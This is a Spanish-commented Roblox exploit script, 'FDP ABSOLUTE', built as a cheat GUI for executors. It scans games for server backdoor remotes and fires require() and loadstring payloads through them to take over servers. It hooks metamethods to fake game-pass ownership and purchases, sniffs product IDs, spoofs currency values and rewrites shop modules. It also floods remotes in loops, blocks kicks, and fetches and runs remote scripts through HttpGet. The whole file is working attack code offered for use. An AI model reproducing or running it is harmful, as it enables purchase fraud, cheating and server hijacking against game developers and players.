--[[ 
    FDP ABSOLUTE - FINAL GOD MODE
    Version: OMEGA (Full Arsenal)
    Target: Delta / Fluxus / Hydrogen / Arceus
    
    [+] NEURAL BACKDOOR HUNTER ADDED
    [+] ALL PREVIOUS TOOLS INCLUDED
]]

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "FDP ABSOLUTE",
    SubTitle = "God Mode + SS Hunter",
    TabWidth = 160,
    Size = UDim2.fromOffset(600, 480),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.RightControl
})

-- --- VARIABLES GLOBALES ---
local Tabs = {
    Home = Window:AddTab({ Title = "Inicio", Icon = "home" }),
    Backdoor = Window:AddTab({ Title = "SS Hunter (NEW)", Icon = "skull" }), -- LA NOVEDAD
    Economy = Window:AddTab({ Title = "Economy (IAP)", Icon = "credit-card" }),
    Remote = Window:AddTab({ Title = "Remote Warfare", Icon = "swords" }),
    DataUI = Window:AddTab({ Title = "Data & UI Break", Icon = "database" }),
    Auto = Window:AddTab({ Title = "Automation", Icon = "bolt" }),
    Eng = Window:AddTab({ Title = "Ingeniería", Icon = "cpu" }),
    Player = Window:AddTab({ Title = "Jugador", Icon = "user" }),
    Settings = Window:AddTab({ Title = "Config", Icon = "settings" })
}

local Options = Fluent.Options
local Notify = function(t, c) Fluent:Notify({Title=t, Content=c, Duration=5}) end

-- --- PESTAÑA 1: DASHBOARD ---
Tabs.Home:AddParagraph({
    Title = "Sistema Supremo Cargado",
    Content = "El arsenal definitivo. Nada ha sido simplificado.\n\n" ..
    "🔥 SS Hunter: Detector de backdoors neuronal (Nil instances + Heurística).\n" ..
    "💰 Economy: Bypass de compras y robo de IDs.\n" ..
    "⚔️ Warfare: Ataque de remotos y lógica difusa.\n" ..
    "🛡️ Data/UI: Manipulación total del cliente."
})

-- ============================================================================
-- PESTAÑA 2: SS HUNTER (DETECTOR ULTRA AVANZADO)
-- ============================================================================

local ScannedRemotes = {}
local SelectedSS = nil

-- Base de datos de firmas de Backdoors famosos
local Signatures = {
    "c00lkidd", "TeamC00lkidd", "Admin", "DoNotDelete", "RobloxClassic", 
    "Sertanejo", "OneMoreTime", "Ahhhhh", "AdminPanel", "Panda", 
    "Krypton", "Code", "Run", "Execute", "By", "Chaos", "Check",
    "rafjel", "k4scripts", "monster", "shit", "bitch", "memohack"
}

-- Algoritmo de Puntuación de Amenaza
local function CalculateThreat(obj)
    local score = 0
    local notes = ""
    local name = obj.Name:lower()
    local parent = obj.Parent and obj.Parent.Name:lower() or "nil"

    -- 1. Análisis de Nombre
    for _, sig in pairs(Signatures) do
        if name:find(sig:lower()) then 
            score = score + 40 
            notes = notes .. "[Nombre Sospechoso] "
            break
        end
    end

    -- 2. Análisis de Ubicación (Los backdoors se esconden en lugares raros)
    if obj.Parent == game:GetService("JointsService") or 
       obj.Parent == game:GetService("Lighting") or 
       obj.Parent == game:GetService("SoundService") or
       obj.Parent == game:GetService("MaterialService") then
        score = score + 35
        notes = notes .. "[Ubicación Rara] "
    end

    -- 3. Análisis de Nil (Oculto en memoria)
    if not obj.Parent then
        score = score + 50
        notes = notes .. "[OCULTO/NIL] "
    end

    -- 4. Análisis de Estructura (Nombres confusos)
    if name:find("ilil") or name:find("wc") or name == "" or name == " " then
        score = score + 20
        notes = notes .. "[Nombre Obfuscado] "
    end

    return score, notes
end

Tabs.Backdoor:AddButton({
    Title = "☢️ INICIAR ESCANEO NEURONAL (DEEP SCAN)",
    Description = "Analiza Workspace, Nil Instances y Servicios Ocultos.",
    Callback = function()
        ScannedRemotes = {}
        local DropList = {}
        local Count = 0
        
        Notify("Escaneando...", "Analizando heurística profunda...")
        
        -- Recolector de Objetos (Incluyendo ocultos si el ejecutor lo permite)
        local Targets = game:GetDescendants()
        if getnilinstances then
            local nils = getnilinstances()
            for _, v in pairs(nils) do table.insert(Targets, v) end
            Notify("Elite Feature", "Escaneando memoria oculta (Nil Instances).")
        end

        for _, obj in pairs(Targets) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local Score, Notes = CalculateThreat(obj)
                
                -- Solo mostramos si tiene un riesgo mínimo o si el usuario quiere ver todo
                if Score >= 20 then
                    Count = Count + 1
                    local ID = string.format("[%d%%] %s (%s)", Score, obj.Name, obj.Parent and obj.Parent.Name or "Nil")
                    ScannedRemotes[ID] = obj
                    table.insert(DropList, ID)
                end
            end
        end
        
        if Count > 0 then
            Notify("ALERTA", "Se encontraron " .. Count .. " posibles backdoors.")
            Options.SSList:SetValues(DropList)
            Options.SSList:SetValue(nil)
        else
            Notify("Seguro", "No se detectaron firmas de backdoors conocidos.")
            Options.SSList:SetValues({"Ninguno"})
        end
    end
})

local SSDrop = Tabs.Backdoor:AddDropdown("SSList", {
    Title = "Resultados del Escáner",
    Values = {"Haz un scan primero"},
    Multi = false,
    Default = nil,
})

SSDrop:OnChanged(function(Value)
    if ScannedRemotes[Value] then
        SelectedSS = ScannedRemotes[Value]
        Notify("Objetivo Fijado", "Seleccionado: " .. SelectedSS.Name)
    end
end)

Tabs.Backdoor:AddSection("Ejecución de Payload (Hack)")

Tabs.Backdoor:AddButton({
    Title = "💉 INYECTAR 'REQUIRE' (Module Loader)",
    Description = "El método más común. Intenta cargar un script de admin externo.",
    Callback = function()
        if not SelectedSS then Notify("Error", "Selecciona un backdoor."); return end
        pcall(function()
            -- Probamos varios IDs de scripts maliciosos conocidos
            SelectedSS:FireServer(tonumber(4952280696)) -- Infinite Yield SS
            SelectedSS:FireServer("require(4952280696).load('"..game.Players.LocalPlayer.Name.."')")
        end)
        Notify("Enviado", "Payload de carga enviado.")
    end
})

Tabs.Backdoor:AddButton({
    Title = "📜 INYECTAR CÓDIGO (Loadstring)",
    Description = "Si el backdoor permite código directo (muy raro/peligroso).",
    Callback = function()
        if not SelectedSS then Notify("Error", "Selecciona un backdoor."); return end
        local Script = [[
            local m = Instance.new("Message", workspace)
            m.Text = "FDP CLIENT: SERVER OWNED"
            wait(5)
            m:Destroy()
            require(4952280696).load("]]..game.Players.LocalPlayer.Name..[[")
        ]]
        pcall(function() SelectedSS:FireServer(Script) end)
        Notify("Enviado", "Payload de código enviado.")
    end
})

-- ============================================================================
-- PESTAÑA 3: ECONOMY (LUCKY PATCHER SUPREMO)
-- ============================================================================
local LP_Prop = false
local LP_Buy = false
local LP_Mock = false
local SniffingID = false

Tabs.Economy:AddSection("Intercepción & Robo")
Tabs.Economy:AddToggle("SniffToggle", {Title="ID SNIFFER", Default=false, Callback=function(Val) SniffingID=Val; if Val then 
    local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and SniffingID and getnamecallmethod():find("Purchase") then local a={...}; for _,v in pairs(a) do if type(v)=="number" and v>100 then Notify("ID DETECTADO", tostring(v)); if Options.CrackID then Options.CrackID:SetValue(tostring(v)) end end end return nil end return old(s,...) end) 
end end})

Tabs.Economy:AddSection("Emulación")
Tabs.Economy:AddToggle("LPToggle", {Title="EMULACIÓN DE PROPIEDAD", Default=false, Callback=function(Val) LP_Prop=Val; if Val then local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and LP_Prop then local m=getnamecallmethod(); if m=="UserOwnsGamePassAsync" or m=="PlayerOwnsAsset" or m=="IsPlayerIdInGroup" then return true end end return old(s,...) end) end end})
Tabs.Economy:AddToggle("BuyToggle", {Title="SIMULADOR DE COMPRA", Default=false, Callback=function(Val) LP_Buy=Val; if Val then local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and LP_Buy and getnamecallmethod():find("Purchase") then Notify("HACK", "Simulando compra..."); task.spawn(function() game:GetService("MarketplaceService").PromptGamePassPurchaseFinished:Fire(game.Players.LocalPlayer, ({...})[1], true) end); return nil end return old(s,...) end) end end})
Tabs.Economy:AddToggle("MockToggle", {Title="ANTI-ERROR (MOCK)", Default=true, Callback=function(Val) LP_Mock=Val; if Val then local old; old=hookmetamethod(game,"__namecall",function(s,...) if not checkcaller() and LP_Mock and getnamecallmethod()=="GetProductInfo" then return {Name="Cracked", PriceInRobux=0, ProductId=0, IsForSale=true} end return old(s,...) end) end end})

Tabs.Economy:AddSection("Manual")
Tabs.Economy:AddInput("CrackID", {Title="ID Objetivo", Default=""})
Tabs.Economy:AddButton({Title="💉 INYECTAR COMPRA", Callback=function()
    local ID = tonumber(Options.CrackID.Value)
    if ID and getconnections then 
        local M = game:GetService("MarketplaceService")
        for _,c in pairs(getconnections(M.PromptGamePassPurchaseFinished)) do c:Fire(game.Players.LocalPlayer, ID, true) end
        for _,c in pairs(getconnections(M.PromptProductPurchaseFinished)) do c:Fire(game.Players.LocalPlayer, ID, true) end
        Notify("OK", "Inyectado.")
    else Notify("Error", "Falta ID o soporte.") end
end})

-- ============================================================================
-- PESTAÑA 4: REMOTE WARFARE
-- ============================================================================
local SniffRemote = false; local CaughtR = nil; local CaughtA = {}
if hookmetamethod then local Old; Old=hookmetamethod(game,"__namecall",function(s,...) if SniffRemote and (getnamecallmethod()=="FireServer" or getnamecallmethod()=="InvokeServer") and not tostring(s):find("Character") then CaughtR=s; CaughtA={...}; SniffRemote=false; Notify("CAPTURED", s.Name) end return Old(s,...) end) end

Tabs.Remote:AddButton({Title="📡 DETECTAR", Callback=function() SniffRemote=true; Notify("...", "Acción") end})
Tabs.Remote:AddButton({Title="⬇️ CARGAR", Callback=function() if CaughtR then Options.RepPath:SetValue(CaughtR:GetFullName()) end end})
Tabs.Remote:AddInput("RepPath", {Title="Ruta", Default=""})
Tabs.Remote:AddInput("RepArgs", {Title="Argumentos (Opcional)", Default=""})
Tabs.Remote:AddButton({Title="🔥 START REPEATER", Callback=function() 
    local R = loadstring("return "..Options.RepPath.Value)()
    if R then 
        task.spawn(function() 
            while true do 
                pcall(function() if R:IsA("RemoteEvent") then R:FireServer(unpack(CaughtA)) else R:InvokeServer(unpack(CaughtA)) end end)
                task.wait(0.1)
            end 
        end)
        Notify("Loop", "Iniciado")
    end
end})

Tabs.Remote:AddButton({Title="🧠 LOGIC FUZZER", Callback=function()
    local R = loadstring("return "..Options.RepPath.Value)()
    if R then
        local P = {{-1}, {0/0}, {math.huge}, {-math.huge}}
        for _, v in pairs(P) do pcall(function() R:FireServer(unpack(v)) end); task.wait(0.1) end
        Notify("Fuzzer", "Enviado")
    end
end})

-- ============================================================================
-- PESTAÑA 5: DATA & UI
-- ============================================================================
local DataHook=false
Tabs.DataUI:AddToggle("DataHook", {Title="VALUE SPOOF", Default=false, Callback=function(V) DataHook=V; if V then local old; old=hookmetamethod(game,"__index",function(s,k) if not checkcaller() and DataHook and k=="Value" then if s.Name:lower():find("vip") then return true end if s.Name:lower():find("money") and old(s,k)<100 then return 999999 end end return old(s,k) end) end end})

Tabs.DataUI:AddButton({Title="💉 INFECTAR MÓDULOS", Callback=function()
    for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if v:IsA("ModuleScript") and (v.Name:find("Shop") or v.Name:find("Check")) then
            local s,m = pcall(require, v)
            if s and type(m)=="table" then for k,f in pairs(m) do if type(f)=="function" and hookfunction then hookfunction(f, function() return true end) end end end
        end
    end
    Notify("Infectado", "Módulos reescritos.")
end})

local SearchUI=""
Tabs.DataUI:AddInput("UIFind", {Title="Buscar Panel", Callback=function(v) SearchUI=v:lower() end})
Tabs.DataUI:AddButton({Title="👁️ FORCE UI + KILL CONN", Callback=function()
    for _,v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
        if v.Name:lower():find(SearchUI) then
            if v:IsA("ScreenGui") then v.Enabled=true end
            if v:IsA("Frame") then v.Visible=true; v.Position=UDim2.new(0.5,-100,0.5,-100) end
            if getconnections then for _,c in pairs(getconnections(v:GetPropertyChangedSignal("Visible"))) do c:Disable() end end
        end
    end
    Notify("UI", "Forzado.")
end})

-- ============================================================================
-- PESTAÑA 6: AUTOMATION, ENG & PLAYER
-- ============================================================================
local Farm=false; local FarmN=""
Tabs.Auto:AddInput("FarmT", {Title="Farm Name", Callback=function(v) FarmN=v end})
Tabs.Auto:AddToggle("FarmGo", {Title="AUTO-FARM", Callback=function(V) Farm=V; if V then task.spawn(function() while Farm do pcall(function() for _,v in pairs(workspace:GetDescendants()) do if v.Name==FarmN and v:IsA("BasePart") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=v.CFrame; task.wait(0.2) end end end) task.wait(1) end end) end end})

Tabs.Eng:AddButton({Title="🐢 TurtleSpy", Callback=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))() end})
Tabs.Eng:AddButton({Title="📂 Dark Dex V3", Callback=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))() end})
Tabs.Eng:AddButton({Title="☢️ Hydroxide", Callback=function() local owner="Upbolt";local branch="revision";local function webImport(file)return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner,branch,file)),file..'.lua')()end;webImport("init");webImport("ui/main") end})

Tabs.Player:AddSlider("WS", {Title="Speed", Default=16, Min=16, Max=300, Callback=function(v) if game.Players.LocalPlayer.Character then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=v end end})
Tabs.Player:AddButton({Title="✈️ Fly V3", Callback=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))() end})
Tabs.Player:AddButton({Title="🛡️ Anti-Kick", Callback=function() local old; old=hookmetamethod(game,"__namecall",function(s,...) if getnamecallmethod():lower()=="kick" then return nil end return old(s,...) end); Notify("OK","Anti-Kick") end})
Tabs.Player:AddButton({Title="👑 Infinite Yield", Callback=function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end})

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
Window:SelectTab(1)
Notify("FDP ABSOLUTE", "SISTEMA COMPLETO INICIADO.")
